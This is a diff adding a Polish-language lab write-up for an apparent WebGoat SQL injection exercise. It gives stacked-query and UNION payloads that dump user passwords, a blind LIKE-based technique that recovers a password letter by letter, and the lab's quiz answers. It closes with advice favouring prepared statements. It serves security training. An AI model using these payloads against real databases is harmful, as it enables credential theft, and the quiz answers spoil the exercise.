@@ -1,0 +1,62 @@
+
+SQL Injection (advanced)
+
+Zad 1
+Dostajemy na start informacje o istniejących tablicach, więc jedyne co zostaje zrobić to wprowadzić odpowiednie dane:
+Po kilku próbach doszedłem do rozwiązania:
+	Tom'; SELECT * FROM user_system_data WHERE ''='	
+Przez co ostateczne zapytanie wygląda w następujący sposób:
+SELECT * FROM user_data WHERE last_name = 'Tom'; SELECT * FROM user_system_data WHERE ''=''
+Zapytanie dostarcza nam informacje o wszystkich użytkownikach i hasłach.
+
+Zadanie ma jeszcze jedno rozwiązanie z użyciem UNION:
+
+' UNION SELECT userid,user_name, password,'1','2','3',4 from user_system_data;--
+Ostateczne zapytanie:
+SELECT * FROM user_data WHERE last_name = '' UNION SELECT userid,user_name, password,'1','2','3',4 from user_system_data;--'
+
+W tym przypadku trzeba pamiętać aby zmienne w obu selectach były te same typy zmiennych.
+
+Zad 2	
+
+Ekran logowania, mamy znaleźć (i zalogować się jako Tom), mamy do dyspozycji ekran logowania oraz do zarejestrowania użytkownika
+Po paru próbach zalogowania się jak Tom, stwierdziłem iż ekran logowania nie jest wrażliwy na ataki injection.
+
+Próba rejestracji jak użytkownik tom, nie powiodła się (już istnieje). Dzięki tej próbie odkryłem wrażliwe pole.
+Po wpisaniu użytkownika tom' AND '1'='1 pojawia się błąd User {0} already exists
+
+Próba utworzenia użytkownika
+ tom' AND password LIKE '%s% - błąd - hasło zawiera literę s 
+ tom' AND password LIKE '%x% - utworzono użytkownika (nie zawiera x)
+
+(można w ten sposób zobaczyć jakie i ile liter znajduje się w haśle)
+
+Lekka optymalizacja
+ tom' AND password LIKE '?% - aby dowiedzieć się też o pozycji przeszukiwanych liter.
+
+t
+th
+thi
+this
+...
+thisisasecretfortomonly
+
+Zad 3
+Quiz
+1. What is the difference between a prepared statement and a statement?
+	Solution 4: A statement has got values instead of a prepared statement
+2. Which one of the following characters is a placeholder for variables?
+	Solution 3: ?
+3. How can prepared statements be faster than statements?
+	Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.
+4. How can a prepared statement prevent SQL-Injection?
+	Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.
+5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?
+	Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.
+
+Wnioski:
+Jeśli istnieje pole które można wykorzystać żeby zrobić injection, to kwestią czasu jest wyciek części lub całej bazy danych, szczególnie kiedy można zautomatyzować proces. Jedyne co wtedy może uchronić bazę danych to osoba fizyczna która akurat sprawdzi ostatnie zapytania (lub ostatnich zarejestrowanych użytkowników jak w zad2) i zobaczyć setki/tysiące nowych użytkowników zawierających sql injection.
+
+Przy rejestrowaniu nowych użytkowników nie powinno się przyjmować znaków specjalnych (tak jest jest to w większości usług internetowych).
+
+Prepared statement są bezpieczniejsze niż zwykłe statement
